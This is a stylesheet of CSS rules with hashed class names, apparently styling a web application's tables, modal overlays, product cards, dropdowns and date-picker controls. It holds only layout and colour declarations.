    ._1Ga04dLndV0BeKj9AewsqD ._2vUNv1tWysYyWPlJwiWjTp ._10-OnMa4sQ4Hcqe4yOH5LQ {
        position: relative;
        text-align: center;
        margin-top: 15px
    }

    ._1Ga04dLndV0BeKj9AewsqD ._2vUNv1tWysYyWPlJwiWjTp ._10-OnMa4sQ4Hcqe4yOH5LQ img {
        display: inline-block
    }

    ._1Ga04dLndV0BeKj9AewsqD ._2vUNv1tWysYyWPlJwiWjTp ._10-OnMa4sQ4Hcqe4yOH5LQ ._38jcND8n_JXBzybDHbEouQ {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._1Ga04dLndV0BeKj9AewsqD ._2vUNv1tWysYyWPlJwiWjTp ._32y7CTBwI4KbnQXIpAaMn4 {
        text-align: center;
        margin-top: 10px
    }

    ._1aQ7iwspKs0-mtuIldghnI ._363zLs0DkUDtWaZ_oIeUZc {
        font-weight: 700;
        margin-bottom: 16px;
        font-size: 20px;
        line-height: 30px
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2UcHqvh7quIl0WKYHfX8jC {
        display: flex;
        align-items: center;
        margin-bottom: 12px
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2UcHqvh7quIl0WKYHfX8jC .rk9r5vzWrqqXYrpo5XQXy {
        margin-left: auto;
        font-weight: 500;
        font-size: 12px;
        line-height: 18px;
        color: var(--ah-secondary);
        cursor: pointer
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2UcHqvh7quIl0WKYHfX8jC .rk9r5vzWrqqXYrpo5XQXy:hover {
        text-decoration: underline
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2UcHqvh7quIl0WKYHfX8jC ._2XR9q0QsOVTlM1ty4ZwPUq {
        font-size: 12px;
        line-height: 18px;
        color: #262626;
        display: flex;
        align-items: center
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2UcHqvh7quIl0WKYHfX8jC ._2XR9q0QsOVTlM1ty4ZwPUq b {
        font-weight: 600;
        margin-right: 4px
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 {
        display: table;
        width: 100%
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 ._3HHpV5oS-2yF6xO6-1VQ6b {
        display: table-header-group
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 ._3HHpV5oS-2yF6xO6-1VQ6b ._2tbOYqO4seZCuLiPH1J_uA {
        display: table-row
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 ._3HHpV5oS-2yF6xO6-1VQ6b ._2tbOYqO4seZCuLiPH1J_uA .eKKaUaZP4hQivqC2B0Yyt {
        display: table-cell;
        padding: 13px 10px;
        background: #e9e9e9;
        font-weight: 500
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 ._3HHpV5oS-2yF6xO6-1VQ6b ._2tbOYqO4seZCuLiPH1J_uA .eKKaUaZP4hQivqC2B0Yyt._3vtVIV18JzINnucTj82H9t {
        width: 34%
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 ._3HHpV5oS-2yF6xO6-1VQ6b ._2tbOYqO4seZCuLiPH1J_uA .eKKaUaZP4hQivqC2B0Yyt._2NTA9BcS3jBd19U6P3xAk0 {
        width: 15%
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 ._3HHpV5oS-2yF6xO6-1VQ6b ._2tbOYqO4seZCuLiPH1J_uA .eKKaUaZP4hQivqC2B0Yyt._36WWlrDwhaI4KKiQRdfpuQ {
        width: 14%
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 ._3HHpV5oS-2yF6xO6-1VQ6b ._2tbOYqO4seZCuLiPH1J_uA .eKKaUaZP4hQivqC2B0Yyt._1Wd5yNAghuMjFz1ANpNsnc {
        width: 12%
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 ._3HHpV5oS-2yF6xO6-1VQ6b ._2tbOYqO4seZCuLiPH1J_uA .eKKaUaZP4hQivqC2B0Yyt._3L08A_J0ELxHwNIB0yXJmM {
        width: 12%
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 ._3HHpV5oS-2yF6xO6-1VQ6b ._2tbOYqO4seZCuLiPH1J_uA .eKKaUaZP4hQivqC2B0Yyt:first-child {
        border-top-left-radius: 4px;
        border-bottom-left-radius: 4px
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 ._3HHpV5oS-2yF6xO6-1VQ6b ._2tbOYqO4seZCuLiPH1J_uA .eKKaUaZP4hQivqC2B0Yyt:last-child {
        border-top-right-radius: 4px;
        border-bottom-right-radius: 4px
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 .g1qccxL5407fbWxuvmAbE {
        display: table-header-group
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 .g1qccxL5407fbWxuvmAbE ._2tbOYqO4seZCuLiPH1J_uA {
        display: table-row
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 .g1qccxL5407fbWxuvmAbE ._2tbOYqO4seZCuLiPH1J_uA ._1dlcts9ohIiRFTopCiTx2g {
        display: table-cell;
        padding: 14px 10px;
        text-align: left;
        vertical-align: middle;
        border-bottom: 1px solid #e2e4e5
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 .g1qccxL5407fbWxuvmAbE ._2tbOYqO4seZCuLiPH1J_uA ._1dlcts9ohIiRFTopCiTx2g .vRqqwdlaC7d3exw2lfej8 {
        position: relative;
        width: 34px;
        height: 34px;
        border-radius: 4px;
        cursor: pointer;
        overflow: hidden
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 .g1qccxL5407fbWxuvmAbE ._2tbOYqO4seZCuLiPH1J_uA ._1dlcts9ohIiRFTopCiTx2g .Nl27h5FDnj8TnwFCo14zq {
        position: absolute;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        border-radius: 4px;
        background-color: rgba(0, 0, 0, 0.7);
        display: flex;
        align-items: center;
        justify-content: center
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 .g1qccxL5407fbWxuvmAbE ._2tbOYqO4seZCuLiPH1J_uA ._1dlcts9ohIiRFTopCiTx2g ._2iqxpjLKmb3FDmnnhHtcME {
        max-width: 280px;
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
        overflow: hidden;
        min-height: 24px;
        cursor: pointer
    }

    ._1aQ7iwspKs0-mtuIldghnI ._2-PTCRExaYBiYi2mpZNA06 .g1qccxL5407fbWxuvmAbE ._2tbOYqO4seZCuLiPH1J_uA ._1dlcts9ohIiRFTopCiTx2g ._1wX0X3ROqedSCLV_wqF8Gd {
        color: #0076f1;
        cursor: pointer;
        white-space: nowrap
    }

    ._1aQ7iwspKs0-mtuIldghnI ._38jcND8n_JXBzybDHbEouQ {
        display: flex;
        justify-content: center;
        align-items: center
    }

    ._3kOTi8K65YKJokjDM_nvOi {
        position: absolute !important;
        top: 0 !important;
        left: 0 !important;
        right: 0 !important;
        bottom: 0 !important;
        background: rgba(0, 0, 0, 0.8) !important;
        z-index: 9999 !important;
        border-radius: 0 0 6px 6px !important
    }

    ._3kOTi8K65YKJokjDM_nvOi ._3dHrRgTa2mpgIGR3cu0zhK {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        display: flex;
        justify-content: center
    }

    ._3kOTi8K65YKJokjDM_nvOi ._3dHrRgTa2mpgIGR3cu0zhK ._2pYc2IxEfsazOWa8vQEp94 {
        margin-top: 80px;
        background: #fff;
        border-radius: 6px;
        max-width: 320px;
        padding: 24px
    }

    ._3kOTi8K65YKJokjDM_nvOi ._3dHrRgTa2mpgIGR3cu0zhK ._2pYc2IxEfsazOWa8vQEp94 * {
        text-align: center
    }

    ._3kOTi8K65YKJokjDM_nvOi ._3dHrRgTa2mpgIGR3cu0zhK ._2pYc2IxEfsazOWa8vQEp94 .HyXoT_mMwwcQn6M9cGL-r {
        margin-top: 20px
    }

    ._3kOTi8K65YKJokjDM_nvOi ._3dHrRgTa2mpgIGR3cu0zhK ._2pYc2IxEfsazOWa8vQEp94 ._3OQCXWc_s2Etk_SytgynY5 {
        padding-top: 8px
    }

    ._3kOTi8K65YKJokjDM_nvOi ._3dHrRgTa2mpgIGR3cu0zhK ._2pYc2IxEfsazOWa8vQEp94 ._3OQCXWc_s2Etk_SytgynY5 span {
        color: #1e96fc
    }

    ._3kOTi8K65YKJokjDM_nvOi .mHvxbXzuekF2dXLp_s9bX {
        text-align: center;
        padding: 8px;
        font-size: 10px;
        line-height: 20px;
        color: var(--ah-grey-300)
    }

    .MFJCBHQDrrjtmICHaAoF0 {
        margin-top: 24px !important
    }

    .MFJCBHQDrrjtmICHaAoF0 ._3XuLesM6Aqa-g0JXLYravW {
        display: grid;
        gap: 16px;
        grid-template-columns: 1fr 1fr
    }

    .MFJCBHQDrrjtmICHaAoF0 ._3XuLesM6Aqa-g0JXLYravW ._1W1OAwYjoksteNEspOTHqf {
        border: 1px solid #d9d9d9;
        border-radius: 6px;
        padding: 8px;
        display: grid;
        grid-template-columns: 77px 1fr;
        gap: 12px;
        align-items: center
    }

    .MFJCBHQDrrjtmICHaAoF0 ._3XuLesM6Aqa-g0JXLYravW ._1W1OAwYjoksteNEspOTHqf img {
        width: 100%;
        border: 1px solid #f5f5f5;
        border-radius: 6px;
        overflow: hidden
    }

    .MFJCBHQDrrjtmICHaAoF0 ._3XuLesM6Aqa-g0JXLYravW ._1W1OAwYjoksteNEspOTHqf .N4g5DK4P2Sigg6nYgm-bu a {
        font-weight: 400;
        font-size: 12px;
        line-height: 18px;
        color: #7b7b7b;
        margin-bottom: 4px;
        max-width: 280px;
        display: -webkit-box;
        -webkit-line-clamp: 2;
        -webkit-box-orient: vertical;
        overflow: hidden;
        cursor: pointer
    }

    .MFJCBHQDrrjtmICHaAoF0 ._3XuLesM6Aqa-g0JXLYravW ._1W1OAwYjoksteNEspOTHqf .NXkXrgnzTM5-BiyG2ZihW {
        font-size: 12px;
        line-height: 22px;
        display: flex;
        align-items: center;
        color: #262626;
        font-weight: 600
    }

    .MFJCBHQDrrjtmICHaAoF0 ._3XuLesM6Aqa-g0JXLYravW ._1W1OAwYjoksteNEspOTHqf .DUogQo_9viQYNwMzH3UZa {
        font-size: 12px;
        line-height: 18px;
        color: #7b7b7b;
        white-space: nowrap;
        margin-right: 6px
    }

    .MFJCBHQDrrjtmICHaAoF0 ._3XuLesM6Aqa-g0JXLYravW ._1W1OAwYjoksteNEspOTHqf ._1afPefFOfcJAI8g3y0hZWS {
        color: #262626;
        margin-left: auto;
        font-weight: 500
    }

    .MFJCBHQDrrjtmICHaAoF0 ._3XuLesM6Aqa-g0JXLYravW ._1W1OAwYjoksteNEspOTHqf ._3lAMRjG4lMSQjgy-5QzUKu {
        display: flex;
        margin-top: 0px
    }

    .MFJCBHQDrrjtmICHaAoF0 ._3QAfhOpTB4Rqr8QG_-e2Ei {
        margin-bottom: 12px;
        display: flex;
        align-items: center
    }

    .MFJCBHQDrrjtmICHaAoF0 ._3QAfhOpTB4Rqr8QG_-e2Ei .z-RGtlpamRrrXW4JYzZKK {
        font-weight: 500;
        font-size: 12px;
        line-height: 18px;
        color: var(--ah-secondary);
        cursor: pointer;
        margin-left: 12px
    }

    .MFJCBHQDrrjtmICHaAoF0 ._3QAfhOpTB4Rqr8QG_-e2Ei .z-RGtlpamRrrXW4JYzZKK:hover {
        text-decoration: underline
    }

    .MFJCBHQDrrjtmICHaAoF0 ._2RQ-5kaITcsJbfYpaINgY7 {
        font-weight: 700;
        font-size: 20px;
        line-height: 30px;
        color: var(--ah-black-100);
        margin-bottom: 12px
    }

    .MFJCBHQDrrjtmICHaAoF0 ._3Ho_VjW1BlNdDwu1yu91yz {
        display: flex;
        align-items: center;
        font-size: 12px;
        line-height: 18px;
        color: #262626
    }

    .MFJCBHQDrrjtmICHaAoF0 ._3Ho_VjW1BlNdDwu1yu91yz b {
        font-weight: 600;
        margin-right: 8px
    }

    .MFJCBHQDrrjtmICHaAoF0 .twXCAXI8D9jT82L-0kklP {
        display: flex;
        align-items: center;
        justify-self: center
    }

    .MFJCBHQDrrjtmICHaAoF0 .twXCAXI8D9jT82L-0kklP ._2Xh3ontyZyX_ZAvomgl7Cr {
        margin-bottom: 8px
    }

    ._2V-_brnof1V59anlI5xHkG ._3sGLuWwv35x70IDg7Brfet {
        cursor: pointer;
        display: flex;
        justify-content: center;
        background-color: var(--ah-primary);
        color: #fff;
        border-radius: 4px;
        padding: 0 14px;
        min-width: 100px;
        font-size: 14px;
        user-select: none;
        height: 38px;
        line-height: 38px
    }

    ._2V-_brnof1V59anlI5xHkG ._3sGLuWwv35x70IDg7Brfet:hover {
        background: var(--ah-primary-hover)
    }

    ._2V-_brnof1V59anlI5xHkG ._1tUHM2riJloDiYhWkTzMF3 {
        text-align: right;
        position: relative
    }

    ._2V-_brnof1V59anlI5xHkG ._1tUHM2riJloDiYhWkTzMF3 .c3n9KP-izOSb3Tf0CWtf9 {
        position: absolute;
        top: calc(100% + 8px);
        right: 0;
        z-index: 2;
        background-color: #fff;
        text-align: left;
        box-shadow: 0px 0px 12px #0000002e;
        border-radius: 4px;
        font-weight: 700;
        font-size: 13px
    }

    ._2V-_brnof1V59anlI5xHkG ._1tUHM2riJloDiYhWkTzMF3 .c3n9KP-izOSb3Tf0CWtf9 ._1wpghw8-_3HrWIpdJICpK6 {
        color: var(--ah-red-100);
        border-bottom: solid 1px #f5f5f5;
        padding: 16px
    }

    ._2V-_brnof1V59anlI5xHkG ._1tUHM2riJloDiYhWkTzMF3 .c3n9KP-izOSb3Tf0CWtf9 .WnOb4-EYpvJRHH_f3485C {
        padding: 16px
    }

    ._2V-_brnof1V59anlI5xHkG ._1tUHM2riJloDiYhWkTzMF3 .c3n9KP-izOSb3Tf0CWtf9 .WnOb4-EYpvJRHH_f3485C ._3nceiRs-4te7tG0VROMSjs {
        font-size: 12px;
        margin-bottom: 10px;
        font-weight: 600;
        color: #333
    }

    ._2V-_brnof1V59anlI5xHkG ._1tUHM2riJloDiYhWkTzMF3 .c3n9KP-izOSb3Tf0CWtf9 .y1p-vxOZDaaCQnfOAcA4e {
        padding: 16px;
        border-top: solid 1px #f5f5f5
    }

    ._2V-_brnof1V59anlI5xHkG ._1tUHM2riJloDiYhWkTzMF3 .c3n9KP-izOSb3Tf0CWtf9 .y1p-vxOZDaaCQnfOAcA4e ._1vyKwHCFlOc-hwy2SDvWzt {
        width: 100%;
        box-sizing: border-box
    }

    ._3excW5vHX0-F_rt6XjM5pe {
        position: relative;
        display: inline-flex
    }

    ._3excW5vHX0-F_rt6XjM5pe * {
        user-select: none;
        font-family: "Poppins", sans-serif !important
    }

    ._3excW5vHX0-F_rt6XjM5pe .aaZvuEFBw2JuCqutJaGvB {
        background-color: #fff;
        box-shadow: 0px 0px 15px #82828261;
        padding: 8px;
        position: absolute;
        z-index: 1;
        display: none;
        right: 0;
        top: calc(100% + 8px)
    }

    ._3excW5vHX0-F_rt6XjM5pe ._6RSIMTbyjR24jgwLMbKL {
        display: block
    }

    ._3excW5vHX0-F_rt6XjM5pe ._1DDawAuU6u8vfgNayGi6NF {
        border: solid 1px #ccc;
        height: 30px;
        box-shadow: 0 0 0 0 black;
        border-radius: 2px;
        outline: none;
        min-width: 190px;
        padding: 0 10px;
        user-select: none;
        cursor: pointer
    }

    ._3excW5vHX0-F_rt6XjM5pe ._2jAC3fYHsx4La_C3SMQRHH {
        display: flex
    }

    ._3excW5vHX0-F_rt6XjM5pe ._12Fr0PolxkzFiOrdzFWSX_,
    ._3excW5vHX0-F_rt6XjM5pe ._2eEWvLYFp9WdvkQQir6Kco {
        height: 100%
    }

    ._3excW5vHX0-F_rt6XjM5pe ._12Fr0PolxkzFiOrdzFWSX_ {
        margin-right: 10px
    }

    ._3excW5vHX0-F_rt6XjM5pe button {
        border: solid 1px #ccc;
        border-radius: 2px;
        outline: none;
        padding: 0 4px;
        user-select: none;
        cursor: pointer;
        text-align: center
    }

    ._3excW5vHX0-F_rt6XjM5pe ._3lvvdT0I-4Q_eqHs6t8b-b {
        display: flex;
        justify-content: space-around;
        background-color: #f0f0f0
    }

    ._3excW5vHX0-F_rt6XjM5pe ._3lvvdT0I-4Q_eqHs6t8b-b select {
        border: solid 1px #ccc;
        border-radius: 0;
        outline: none;
        padding: 2px 8px;
        background-color: #fff;
        width: 82px;
        color: #333;
        user-select: none;
        cursor: pointer
    }

    ._3excW5vHX0-F_rt6XjM5pe ._3lvvdT0I-4Q_eqHs6t8b-b select * {
        color: #333
    }

    ._3excW5vHX0-F_rt6XjM5pe .gpGbAH_lxvTBNKmIt0_N9 {
        display: flex;
        justify-content: center
    }

    ._3excW5vHX0-F_rt6XjM5pe .gpGbAH_lxvTBNKmIt0_N9 button {
        margin: 4px;
        border-radius: 4px;
        padding: 6px 20px;
        min-width: 90px;
        cursor: pointer;
        user-select: none;
        text-align: center
    }

    ._3excW5vHX0-F_rt6XjM5pe .gpGbAH_lxvTBNKmIt0_N9 button * {
        cursor: pointer;
        user-select: none
    }

    ._3excW5vHX0-F_rt6XjM5pe .gpGbAH_lxvTBNKmIt0_N9 ._2ZGEfwZQdZfIK3rjE2wYaN:hover {
        color: #333;
        background-color: #ececec
    }

    ._3excW5vHX0-F_rt6XjM5pe .gpGbAH_lxvTBNKmIt0_N9 ._2ZGEfwZQdZfIK3rjE2wYaN:active {
        color: #333;
        background-color: #d8d8d8
    }

    ._3excW5vHX0-F_rt6XjM5pe .gpGbAH_lxvTBNKmIt0_N9 ._3_uNrJuRoQyeSMNiN6z1F2 {
        border: solid 1px #e9162b;
        background-color: #e9162b;
        color: #fff
    }

    ._3excW5vHX0-F_rt6XjM5pe .gpGbAH_lxvTBNKmIt0_N9 ._3_uNrJuRoQyeSMNiN6z1F2:hover {
        border-color: #d81124;
        background-color: #d81124;
        color: #fff
    }

    ._3excW5vHX0-F_rt6XjM5pe .gpGbAH_lxvTBNKmIt0_N9 ._3_uNrJuRoQyeSMNiN6z1F2:hover svg path {
        fill: #fff
    }

    ._3excW5vHX0-F_rt6XjM5pe .gpGbAH_lxvTBNKmIt0_N9 ._3_uNrJuRoQyeSMNiN6z1F2:active {
        border-color: #a80f1e;
        background-color: #a80f1e;
        color: #fff
    }

    ._3excW5vHX0-F_rt6XjM5pe .gpGbAH_lxvTBNKmIt0_N9 ._3_uNrJuRoQyeSMNiN6z1F2:active svg path {
        fill: #fff
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax {
        min-height: 460px;
        padding: 0px 20px 6px
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._77q7YzLcVC3mmLOsQh1cv {
        padding-bottom: 12px;
        position: relative;
        display: flex;
        justify-content: space-between;
        box-shadow: 0px 1px 8px rgba(0, 0, 0, 0.08)
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._77q7YzLcVC3mmLOsQh1cv ._1IQc5woy3FGR9UyLIwZzMr {
        display: inline-flex;
        align-items: center
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._77q7YzLcVC3mmLOsQh1cv ._1IQc5woy3FGR9UyLIwZzMr ._2cP21SFkuc_Ny5CTEhcwWJ {
        font-size: 20px;
        font-weight: 700;
        line-height: 38px;
        color: #000
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._77q7YzLcVC3mmLOsQh1cv:after {
        content: '';
        display: block;
        width: calc(100% + 40px);
        position: absolute;
        bottom: 0;
        left: -20px
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3Ih7N7csgMu3fC3-lG75xl {
        display: flex;
        justify-content: space-between;
        margin-top: 16px
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3Ih7N7csgMu3fC3-lG75xl ._2rR-zjkBSHz-4uAIw27nUJ {
        display: inline-flex;
        align-items: center
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3Ih7N7csgMu3fC3-lG75xl ._1_YSRigWc-HVN61Fapd6Z9 {
        width: 45px;
        height: 45px;
        background-position: center;
        background-size: contain;
        background-repeat: no-repeat;
        border: solid 1px #e2e4e5;
        border-radius: 4px;
        display: flex;
        align-items: center;
        justify-content: center
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3Ih7N7csgMu3fC3-lG75xl ._1_YSRigWc-HVN61Fapd6Z9 svg {
        width: 60px
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3Ih7N7csgMu3fC3-lG75xl ._32rXruTdk5WwAoMBNEpyAN {
        color: #2e2e2e;
        padding-left: 12px
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3Ih7N7csgMu3fC3-lG75xl ._32rXruTdk5WwAoMBNEpyAN span {
        font-size: 14px;
        color: #262626
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3Ih7N7csgMu3fC3-lG75xl ._32rXruTdk5WwAoMBNEpyAN ._3UEzYP0ViWgkXTs-1FoipH {
        color: #555555;
        font-size: 12px;
        line-height: 20px
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3Ih7N7csgMu3fC3-lG75xl ._134zKOy424MNtuwJo9F9tk {
        display: flex;
        z-index: 999999;
        gap: 12px 16px
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3Ih7N7csgMu3fC3-lG75xl ._134zKOy424MNtuwJo9F9tk ._3XuvbagQM4bdbNhueUtBCa {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        width: 24px;
        height: 24px;
        cursor: pointer;
        position: relative;
        border-radius: 50%;
        overflow: hidden
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3Ih7N7csgMu3fC3-lG75xl ._134zKOy424MNtuwJo9F9tk ._3XuvbagQM4bdbNhueUtBCa * {
        cursor: pointer;
        user-select: none
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3Ih7N7csgMu3fC3-lG75xl ._134zKOy424MNtuwJo9F9tk ._3XuvbagQM4bdbNhueUtBCa svg {
        width: 24px;
        height: 24px
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3Ih7N7csgMu3fC3-lG75xl ._134zKOy424MNtuwJo9F9tk ._3XuvbagQM4bdbNhueUtBCa:first-child {
        margin-left: 0
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3Ih7N7csgMu3fC3-lG75xl ._134zKOy424MNtuwJo9F9tk ._3XuvbagQM4bdbNhueUtBCa:active {
        color: var(--ah-primary-hover)
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3Ih7N7csgMu3fC3-lG75xl ._134zKOy424MNtuwJo9F9tk ._3XuvbagQM4bdbNhueUtBCa:active svg path {
        fill: var(--ah-primary-hover)
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3Ih7N7csgMu3fC3-lG75xl ._134zKOy424MNtuwJo9F9tk ._3XuvbagQM4bdbNhueUtBCa:active svg rect,
    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3Ih7N7csgMu3fC3-lG75xl ._134zKOy424MNtuwJo9F9tk ._3XuvbagQM4bdbNhueUtBCa:active circle {
        stroke: var(--ah-primary)
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._2x_aYPRA5DgobaehXdlTBS ._3NSzZpIaVHAToavyPCr00h {
        text-transform: uppercase;
        margin-bottom: 6px;
        color: #262626;
        font-weight: 600;
        font-size: 12px;
        line-height: 20px
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s .npkqOxD9jNshJCe--PDyk {
        margin-top: 20px
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s .npkqOxD9jNshJCe--PDyk .Saq-Bu56m4NvcuVnGq9GY {
        font-size: 18px;
        font-weight: 600;
        margin-bottom: 16px;
        color: #262626
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s .npkqOxD9jNshJCe--PDyk ._1CXuDQVSXKjxg8ICu5I3GW {
        display: flex
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s .npkqOxD9jNshJCe--PDyk ._2DDVVyebbd4jXT94V09AND {
        display: flex
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s .npkqOxD9jNshJCe--PDyk .OOIhN0-eMg8esloH49OF9 {
        width: 48px;
        height: 48px;
        min-width: 48px;
        background-position: center;
        background-repeat: no-repeat;
        background-size: contain
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3qLpEIIeO_FKqxR0ZdyW56 {
        margin-top: 36px
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3qLpEIIeO_FKqxR0ZdyW56 ._1Cnb39-VC9Qua8hHU8xryw {
        font-size: 14px;
        font-weight: 600;
        text-transform: uppercase;
        margin-bottom: 16px;
        color: #000
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3qLpEIIeO_FKqxR0ZdyW56 ._8C-InhVDR-qvPIH1FLxqc {
        min-height: 220px
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3ffiMelOCylcpg8YdLkS8B {
        display: block;
        position: relative
    }

    ._1Mjn2-UHibbgnHXPakFspU.BEyDeSgT8zO7rgHDhsDax ._65klnsrgqQsBV3V-z3H1s ._3ffiMelOCylcpg8YdLkS8B ._23MffywmU0Jou667kJkNOm {
        position: absolute;
        top: 0;
        left: -20px;
        right: -20px;
        bottom: -6px;
        z-index: 9999
    }

    ._1tNjvRIPUvbtaLIhHwkyEd {
        width: 100% !important
    }

    ._1tNjvRIPUvbtaLIhHwkyEd ._1kRQLMwrT2VnZkkCzl0X1F {
        display: grid;
        grid-template-columns: 1fr 1fr 1fr 1fr;
        gap: 30px
    }

    ._1tNjvRIPUvbtaLIhHwkyEd ._1kRQLMwrT2VnZkkCzl0X1F ._3l8I0Oj9ERg1G_ibQFbROm {
        display: block;
        margin-bottom: 16px
    }

    ._1tNjvRIPUvbtaLIhHwkyEd ._1kRQLMwrT2VnZkkCzl0X1F ._3l8I0Oj9ERg1G_ibQFbROm .ndRT3uWXLvN-NqnbJoqX7 {
        width: 100%;
        padding-bottom: 100%;
        min-width: 48px;
        background-position: center;
        background-size: contain;
        background-repeat: no-repeat;
        border: solid 1px #e2e4e5;
        border-radius: 4px;
        margin-right: 10px;
        cursor: pointer
    }

    ._1tNjvRIPUvbtaLIhHwkyEd ._1kRQLMwrT2VnZkkCzl0X1F ._3l8I0Oj9ERg1G_ibQFbROm ._1OJ7u4VyF4I_JWWMRJmO5z {
        width: 100%
    }

    ._1tNjvRIPUvbtaLIhHwkyEd ._1kRQLMwrT2VnZkkCzl0X1F ._3l8I0Oj9ERg1G_ibQFbROm ._2NCOSAgJ43OeIlIf9PdBrh {
        font-size: 14px;
        font-weight: 500;
        display: block;
        text-overflow: ellipsis;
        overflow: hidden;
        white-space: nowrap;
        padding-right: 20px;
        cursor: pointer
    }

    ._1tNjvRIPUvbtaLIhHwkyEd ._1kRQLMwrT2VnZkkCzl0X1F ._3l8I0Oj9ERg1G_ibQFbROm ._34ja1a6_qjO879L5kZYXvh {
        margin-top: 5px
    }

